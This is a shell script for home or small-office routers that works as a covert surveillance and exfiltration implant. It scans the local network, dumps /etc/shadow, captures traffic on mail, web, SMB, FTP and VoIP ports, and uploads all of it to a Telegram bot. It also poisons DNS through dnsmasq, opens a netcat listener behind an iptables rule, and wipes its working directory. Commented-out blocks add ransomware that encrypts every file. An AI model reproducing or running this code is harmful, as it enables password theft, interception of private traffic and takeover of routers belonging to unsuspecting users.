#!/bin/ash
#echo $SHELL to see what shell it's use
current_date=$(date "+%d-%m-%Y")
wget -q --spider http://google.com
if [ $? -eq 0 ]; then
    # Telegram bot info
    token=""
    chat_id=""
    wifi_interface="br-lan" # to be change in base of wireless interface of router

    echo "Internet ok"

    echo "Check space available..."
    # Get memory in KiB
    mem=$(df -k | awk '$NF=="/overlay"{print $4}')
    # Remove characters
    mem_kb=$(echo $mem | awk '{print int($1)}')
    # Convert KiB to MB 
    mem_mb=$(expr $mem_kb / 1024)

    # Check if the value is less than 5
    if [ "$mem_mb" -lt 5 ]; then
        echo "Available memory less than 5MB"
        echo "    - Nmap will not be installed"
        opkg update
        opkg install openssh-sftp-server #51.21 KiB KiB
        opkg install libmbedtls #217.33 KiB
        opkg install curl #57.56 KiB
        opkg install ip-tiny #119.81 KiB
        opkg install tcpdump #281.03 KiB  
        echo "Dependencies ok"

        # Get public ip
        public_ip=$(curl -s https://ifconfig.me/ip)

        echo "Create Report..."
        # Create file report
        report="report_$public_ip.txt"
        touch $report
        # Get and Save system info
        uname -a >> $report 
        # Get and Save public ip
        echo "Public Ip:" $public_ip >> $report 
        echo >> $report
        # Get and Save interface info
        ifconfig >> $report 
        # Get and Save devices connected
        ip neigh | awk '{ if ($5 ~ /^[0-9a-f]{2}(:[0-9a-f]{2}){5}$/) { print "Ip: "$1 "\n Interface: "$3 "\n Mac: "$5 "\n Route: "$6 "\n" } }' >> $report
        echo "Task complete"

        echo "Send Report..."
        #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Report: $public_ip"
        #curl -F chat_id="$chat_id" -F document=@"$report" "https://api.telegram.org/bot$token/sendDocument"
        #rm "$report"
        exit 1
    fi 

    echo "Available memory more than 5MB"
    echo "    - Nmap will be installed"

    opkg update
    opkg install nmap-full #2.14 MiB 
    opkg install openssh-sftp-server #51.21 KiB KiB
    opkg install curl #57.56 KiB
    opkg install tcpdump #281.03 KiB tcpdump 
    echo "Dependencies ok"
    sleep 1

    # Create a file to save results
    echo "Start scanning..."
    nmap_output_file="nmap_scan_$current_date.txt"
    touch $nmap_output_file
    ip_address=$(ip addr show $wifi_interface | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)     
    # Start scanning
    nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
    echo "Scanning complete"

    # Get public IP
    public_ip=$(curl -s https://ifconfig.me/ip)
    echo "Public ip: $public_ip"

    # Get system info
    system_info=$(uname -a)

    # Get ifconfig result
    ifconfig_output_file="ifconfig_$public_ip.txt"
    touch $ifconfig_output_file
    ifconfig > $ifconfig_output_file

    #Send report
    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
    #curl -F chat_id="$chat_id" -F document=@"$nmap_output_file" "https://api.telegram.org/bot$token/sendDocument"
    #curl -F chat_id="$chat_id" -F document=@"$ifconfig_output_file" "https://api.telegram.org/bot$token/sendDocument"
    #rm "$nmap_output_file"
    #rm "$ifconfig_output_file"

    #Port forwarding
    #f_port=3000
    #echo "Enabling portforwarding on port $f_port..."
    #iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info %0APort forwading enabled: $public_ip":"$f_port"        

    #DNS poisoning
    #site to redirect 
    domain="example.com"
    #set remote ip where to redirect the site
    ip_server=""
    #edit dnsmasq.conf
    echo "address=/$domain/$ip_server" >> /etc/dnsmasq.conf
    #restart dnsmasq
    systemctl restart dnsmasq
    #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Redirection completed successfully: $domain -> $ip_server"

    #Session controll
    #sessions=$(who | awk '{print $1 " " $2 " " $5}' | grep "root")
    #count=$(echo "$sessions" | wc -l)
    #if [ "$count" -ge 2 ]; then
        #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Warning: $count sessions %0AAutoremove"
        #rm -rf ./*
    #fi

    ##Deny Connection
    #iptables -A INPUT -s <IP_host> -j DROP
    #iptables -A OUTPUT -d <IP_host> -j DROP
    
    #Allow Connection
    #iptables -A INPUT -s <IP_host> -j DROP
    #iptables -A OUTPUT -d <IP_host> -j DROP

    #Send report
    filepath1=$nmap_output_file
    filepath3=$ifconfig_output_file
    curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
    curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
    curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
    rm "$filepath1"
    rm "$filepath3"

    # Dump /etc/shadow file
    result_shadow="result_shadow_$public_ip.txt"
    touch $result_shadow
    cat /etc/shadow > $result_shadow
    curl -F chat_id="$chat_id" -F document=@"$result_shadow" "https://api.telegram.org/bot$token/sendDocument"
    rm "$result_shadow"

    #Crypt System
    #function to generate a random password
    #function generate_password {
        #generate a random password using openssl rand
        #password=$(openssl rand -base64 16)
        #send the generated password
        #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="System Crypted: $public_ip %0APassword: $password"
    #}
    #call function
    #generate_password
    #creates a list of all files
    #files=$(find / -type f)
    #encrypts each file using the generated password
    #for file in $files; do
        #create encrypted file name
        #encrypted_file="$file.enc"
        #encrypt the file using openssl and the generated password
        #openssl enc -aes-256-cbc -salt -in "$file" -out "$encrypted_file" -pass pass:"$password"
        #eemoves the original file if encryption was successful
        #if [ $? -eq 0 ]; then
        #rm "$file"
        #fi
    #done

    # Remote Shell enabled for 30 minutes
    h=$(date +"%H:%M")
    start="14:00"
    stop="14:30"
    port=4000
    if [ "$h" = "$start" ]; then
        echo "Enabling port forwarding on port $port..."
        iptables -A INPUT -p tcp --dport $port -j ACCEPT
        echo "Start listening..."
        nc -l -p $port
        # send notification
        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip:$port"
        while [ "$h" != "$stop" ]; do
            echo "Listening..."
            sleep 1
            h=$(date +"%H:%M")
        done
        echo "Stop port forwarding on port $port..."
        iptables -A INPUT -p tcp --dport $port -j DROP
        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Stop listening: $public_ip:$port"
    fi

    # Identify new host
    wifi_interface="wlan0"
    #gets the list of all available network interfaces and filters only the Ethernet ones
    ethernet_interfaces=$(ip link | awk -F: '$0 !~ "lo|vir|wl|^[^0-9]"{print $2}')
    #obtains MAC addresses from the specified network interfaces
    get_mac_addresses() {
      arp -a | awk '{print $4}' | sort -u
    }
    #stores currently known MAC addresses
    known_macs=$(get_mac_addresses)
    while true; do
        #gets the currently detected MAC addresses for all Ethernet interfaces
        current_macs=$(for interface in $ethernet_interfaces; do
            ip neigh show dev $interface | awk '{print $5}'
        done | sort -u)
        #compares currently detected MAC addresses with known MAC addresses
        new_macs=$(comm -13 <(echo "$known_macs") <(echo "$current_macs"))
        #if there are new MAC addresses, it prints a message
        if [ -n "$new_macs" ]; then
            curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="New macs: $new_macs"
            #update known MAC addresses
            known_macs="$current_macs"
        fi

        # Intercept traffic
        echo "Start intercepting..."
        #max size of file .pcap
        MAX_FILE_SIZE=200000000  # 200MB in byte
        #name of file
        tcpdump_output_file="intercept$current_date.pcap"
        #filter to apply at tcpdump
        filter_tcpdump="(tcp port 25 or tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 445 or tcp port 137 or tcp port 139 or tcp port 21 or tcp port 23 or udp port 69 or udp portrange 10000-20000 or (udp and (port 5060 or portrange 10000-20000)))"
        #start tcpdump to capture traffic and save all on file .pcap
        tcpdump -i any -s 0 -w "$tcpdump_output_file" "$filter_tcpdump" &
        #save PID of tcpdump process
        tcpdump_pid=$!
        #cicle while to check size of file .pcap
        while true; do
            #obtain current size of file .pcap
            FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
            #if the size > 200mb stop tcpdump process 
            if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
                kill -SIGINT "$tcpdump_pid"
                break
            fi
            #else wait 1 second before to check size of file .pcap
            sleep 1
        done
        #send file via telegram
        curl -F chat_id="$chat_id" -F document=@"$tcpdump_output_file" "https://api.telegram.org/bot$token/sendDocument"
        rm "$tcpdump_output_file"
    done
else
    echo "Internet not ok"
    rm -rf ./*
fi
